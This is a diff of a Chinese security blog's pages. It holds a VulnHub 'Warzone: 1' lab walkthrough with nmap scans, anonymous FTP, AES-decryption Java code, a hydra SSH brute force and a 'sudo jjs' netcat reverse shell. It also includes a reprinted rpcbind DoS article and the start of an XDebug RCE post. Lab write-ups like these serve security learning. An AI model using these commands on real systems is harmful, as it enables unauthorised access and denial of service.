@@ -86,6 +86,223 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/11/Warzone-1/">
+                WARZONE 1
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="warzone-1">WARZONE: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称warzone-1">名称：Warzone: 1</span></h4><h4><span id="发布日期20201024">发布日期：2020.10.24</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>captain:&#x2F;~&#x2F;Desktop&#x2F;user.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;root.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名warzoneova">文件名：Warzone.ova</span></h4><h4><span id="文件大小22gb">文件大小：2.2GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzoneova">下载地址：</span></h4><h4><span id="md5-98fc0985c32a2380a0afbf24222c22d5">MD5: 98FC0985C32A2380A0AFBF24222C22D5</span></h4><h4><span id="sha1-0fb9dbc8d8516b462c4e1c8735d41b01d57f2b35">SHA1: 0FB9DBC8D8516B462C4E1C8735D41B01D57F2B35</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机warzone1和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/Warzone-1/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/3.png" alt="image"></p>
+<p>2.再进行端口扫描，发现开放了21，22和5000端口，访问5000端口，发现栅栏密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.128 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/4.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-1/5.png" alt="image"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;gobuster dir -u http://192.168.56.128:5000 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="页面信息获取">页面信息获取</span></h3><blockquote>
+<p>1.栅栏密码的原文应该是Its a warzone，加密后变成Iwotaaznsre，将源码中的字串解密（<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777%EF%BC%89%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%EF%BC%9A">http://www.atoolbox.net/Tool.php?Id=777）得到路径：</a></p>
+<p><img src="/2023/12/11/Warzone-1/7.png" alt="image"></p>
+<p>2.访问页面路径，得到8个用户及对应密码加密，加密字段无法用base64直接解开：</p>
+<p><img src="/2023/12/11/Warzone-1/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
+<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.128</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/9.png" alt="image"></p>
+<p>2.在&#x2F;pub目录下我们能发现note.txt，提示我们密码都是用warzone-encrypt.jar进行加密的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd pub</span><br><span class="line">ls -la</span><br><span class="line">get note.txt</span><br><span class="line">get warzone-encrypt.jar</span><br><span class="line">quit</span><br><span class="line">cat note.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/10.png" alt="image"></p>
+<p><img src="/2023/12/11/Warzone-1/11.png" alt="image"></p>
+</blockquote>
+<h3><span id="jar加密算法反解">jar加密算法反解</span></h3><blockquote>
+<p>1.查看warzone-encrypt.jar，发现是用AES对密码进行加密的，这样的话我们依加密算法写出解密算法即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Main.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> crypto.AES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String encryptpasswd)</span> &#123;</span><br><span class="line">       <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">       <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           ea.cipher.init(<span class="number">2</span>, ea.key, ea.iv);</span><br><span class="line">           <span class="type">byte</span>[] encryptbytes = Base64.getDecoder().decode(encryptpasswd);</span><br><span class="line">           <span class="type">byte</span>[] decryptbytes = ea.cipher.doFinal(encryptbytes);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decryptbytes);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">           System.out.print(<span class="string">&quot;enter the encryptpassword to decrypt : &quot;</span>);</span><br><span class="line">           <span class="type">String</span> <span class="variable">encryptpassword</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">           System.out.println(<span class="string">&quot;password : &quot;</span> + decrypt(encryptpassword));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">AES.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> crypto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AES</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">IvParameterSpec</span> <span class="variable">DEFAULT_IV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">19</span>]);</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRANSFORMATION</span> <span class="operator">=</span> <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> Key key;</span><br><span class="line"> <span class="keyword">public</span> IvParameterSpec iv;</span><br><span class="line"> <span class="keyword">public</span> Cipher cipher;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, <span class="number">128</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, bit, <span class="literal">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit, String iv)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (bit == <span class="number">256</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;SHA-256&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">if</span> (iv != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, iv));</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = DEFAULT_IV;</span><br><span class="line">   &#125; </span><br><span class="line">   init();</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, String text) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> getHash(algorithm, text.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getHash(String algorithm, <span class="type">byte</span>[] data) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(algorithm);</span><br><span class="line">     digest.update(data);</span><br><span class="line">     <span class="keyword">return</span> digest.digest();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> encrypt(str.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.cipher.init(<span class="number">1</span>, <span class="built_in">this</span>.key, <span class="built_in">this</span>.iv);</span><br><span class="line">     <span class="type">byte</span>[] encryptData = <span class="built_in">this</span>.cipher.doFinal(data);</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(encryptData));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encryptString</span><span class="params">(String content)</span> &#123;</span><br><span class="line">   <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">   <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">   <span class="keyword">return</span> ea.encrypt(content);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Obfuscated.java</span><br><span class="line"><span class="keyword">package</span> Other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Obfuscated</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getIV</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur31vv&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;w4rz0n3s3cur3k3y&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.将用户和加密后密码输入得到对应的用户及解密密码字典，利用hydra进行ssh爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.dic -P pass.dic ssh://192.168.56.128</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/12.png" alt="image"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.ssh登录commando用户，查看历史：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh commando@192.168.56.128</span><br><span class="line"></span><br><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/13.png" alt="image"></p>
+<p>2.可以发现&#x2F;home&#x2F;captain&#x2F;Desktop目录下有user.txt，但我们无权查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/captain/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/14.png" alt="image"></p>
+<p>3.在&#x2F;.crypt目录下能发现readme.txt，readme.txt提醒密码就在这里，还有一段加密程序encrypt.py和.c：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .crypt</span><br><span class="line">ls -la</span><br><span class="line">cat readme.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/15.png" alt="image"></p>
+<p>4.查看encrypt.py，.c和script.sh，我们能够知道script.sh是将参数输入encrypt.py后由encrypt.py加密生成.c中的字串，我们可以写一个解密程序，将captain用户的密码解密出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat encrypt.py</span><br><span class="line">cat .c</span><br><span class="line">cat script.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/16.png" alt="image"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip3 install simple-crypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> simplecrypt <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;sekret&#x27;</span></span><br><span class="line">text = base64.b64decode(<span class="string">&#x27;c2MAAk1Y/hAsEsn+FasElyXvGSI0JxD+n/SCtXbHNM+1/YEU54DO0EQRDfD3wz/lrbkXEBJJJd1ylXZpi/2dopaklmG6NCAXfGKl1eWAUNU1Iw==&#x27;</span>)</span><br><span class="line">passwd = decrypt(key, text)</span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/17.png" alt="image"></p>
+<p>5.登录到captain用户，可以查看第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/18.png" alt="image"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.通过sudo -l命令，可以看到jjs（jjs是让javascript可以调用java）可以执行特权命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/19.png" alt="image"></p>
+<p>2.那我们可以写一个java的shell提权利用js去调用再使用jjs去执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;/usr/bin/nc -e /bin/bash 192.168.56.102 1234&#x27;)&quot;|sudo jjs</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/20.png" alt="image"></p>
+<p>3.成功提权到root，并可以在&#x2F;root&#x2F;Desktop下发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/Warzone-1/21.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/07/RPCBind-DDOS/">
+                111端口rpcbind漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="111端口rpcbind漏洞">111端口rpcbind漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/108852581">Mamba start</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>rpcbind是NFS中用来进行消息通知的服务</p>
+</blockquote>
+<h2><span id="实验环境">实验环境</span></h2><blockquote>
+<p>攻击机：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a> linux<br>ip:192.168.172.134<br>目标机：Metasploittable2<br>ip:192.168.172.129</p>
+</blockquote>
+<h2><span id="攻击过程">攻击过程</span></h2><h3><span id="step1使用nmap探测">step1:使用nmap探测</span></h3><blockquote>
+<p>命令：<code>nmap 192.168.172.129</code></p>
+<p>命令：<code>nmap -sV -p 111 192.168.172.129</code></p>
+<p>命令：<code>nmap -p 111 --script=rpcinfo 192.168.172.129</code></p>
+</blockquote>
+<h3><span id="step2metasploit模块探测">step2:metasploit模块探测</span></h3><blockquote>
+<p>启动msf</p>
+<p>命令：<code>use auxiliary/scanner/misc/sunrpc_portmapper</code></p>
+<p>命令：<code>show options</code></p>
+<p>本文讲的是只需60字节就可通过rpcbind让服务器崩溃，全世界的人都知道这玩意儿的用处，人们就这么任由它一直开着，无语。所以，要么补上，要么关闭吧。</p>
+</blockquote>
+<h2><span id="写在后面">写在后面</span></h2><blockquote>
+<p>向rpcbind服务的UDP套接字发送60字节载荷，便可填充目标内存，搞崩主机系统。<br>圭多·乌兰肯，该漏洞发现者兼“Rpcbomb”漏洞利用程序开发者，抱怨称该软件包维护者毫无反应，他不得不自己写了补丁。</p>
+<p>漏洞利用&amp;补丁：<a target="_blank" rel="noopener" href="https://github.com/guidovranken/rpcbomb">https://github.com/guidovranken/rpcbomb</a></p>
+<p>他写道，Shodan搜索发现，互联网上开放 rpcbind 111 端口的主机有180万台。其中大多数都运行在AWS之类大规模托管上，用户总是直接沿用Linux发行版的默认配置(111端口开放)。</p>
+<p>如果你真的需要使用rpcbind服务(将远程过程调用RPC与地址绑定)，就把它置于防火墙后，限制111端口对外开放吧。最好就是直接关了。</p>
+<p>GitHub上的补丁足够小，开发者们应该可以验证这些补丁的短小精悍：rpcbind只需要两行代码就能修复，不像libtirpc要256行。</p>
+<p>乌兰肯称，该漏洞可使攻击者在远程rpcbind绑定主机上分配任意大小的内存(每次攻击最高可达4GB)，除非进程崩溃，或者管理员挂起&#x2F;重启rpcbind服务，否则该内存不会被释放。</p>
+<p>当然，除了不断占用目标系统的内存，攻击者还可以干别的事，因为有些软件在内存分配失败的时候，是会发生不可预知的错误的。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RPCBind/" rel="tag">RPCBind</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/07/XDebug-RCE/">
+                XDebug 远程调试漏洞（代码执行）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="xdebug-远程调试漏洞代码执行">XDebug 远程调试漏洞（代码执行）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/">joker0xxx3</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
